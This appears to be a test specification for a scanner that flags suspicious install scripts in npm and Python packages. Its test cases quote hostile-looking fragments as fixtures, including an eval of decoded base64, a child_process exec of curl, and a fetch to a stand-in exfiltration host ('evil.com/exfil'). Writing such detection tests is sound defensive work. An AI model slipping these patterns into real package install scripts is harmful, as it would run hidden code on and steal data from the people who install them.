# Test Spec — Task 012: Install script analysis

## Unit tests (InstallScriptPolicy)

### T-012-01: Clean script passes
- ScanContext with install_scripts = [InstallScript { name: "postinstall", content: "echo done" }]
- Expected: PolicyResult::Pass

### T-012-02: eval() in script blocks
- ScanContext with script containing `eval(Buffer.from(...))`
- Expected: PolicyResult::Block with pattern name

### T-012-03: child_process require blocks
- Script: `require('child_process').exec('curl ...')`
- Expected: Block

### T-012-04: Base64 string above threshold warns
- Script containing a 60-char base64 string
- Expected: Warn or Block

### T-012-05: HTTP URL in script warns
- Script: `fetch('https://evil.com/exfil')`
- Expected: Warn

### T-012-06: subprocess in Python script blocks
- Script: `import subprocess; subprocess.call([...])`
- Expected: Block

### T-012-07: No install scripts passes
- ScanContext with empty install_scripts
- Expected: Pass

### T-012-08: Multiple patterns in one script reports worst
- Script with eval AND child_process
- Expected: Block (not double-reported)

## Registry extraction tests

### T-012-09: npm registry extracts scripts field
- wiremock npm JSON with scripts.postinstall = "node malicious.js"
- Expected: ScanContext.install_scripts populated with postinstall script

### T-012-10: npm package without scripts field
- wiremock npm JSON with no scripts
- Expected: ScanContext.install_scripts empty
